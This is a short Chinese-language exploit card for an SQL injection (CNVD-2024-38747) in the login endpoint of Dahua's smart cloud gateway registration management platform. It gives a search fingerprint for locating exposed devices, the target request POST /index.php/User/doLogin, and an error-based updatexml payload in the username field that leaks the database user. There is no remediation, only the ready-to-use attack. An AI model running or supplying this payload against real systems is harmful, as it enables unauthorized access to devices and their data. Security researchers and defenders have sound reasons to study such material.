# 大华智能云网关注册管理平台doLoginSQL注入漏洞(CNVD-2024-38747)

大华 ｜ SQL注入 ｜ —
- **指纹**：`title="智能云网关注册管理平台"`
- **请求**：`POST /index.php/User/doLogin HTTP/1.1`

**Payload**
```
username=1')and+updatexml(1,concat(0x7e,user(),0x7e),1)--+&password=
```
- **响应特征**：200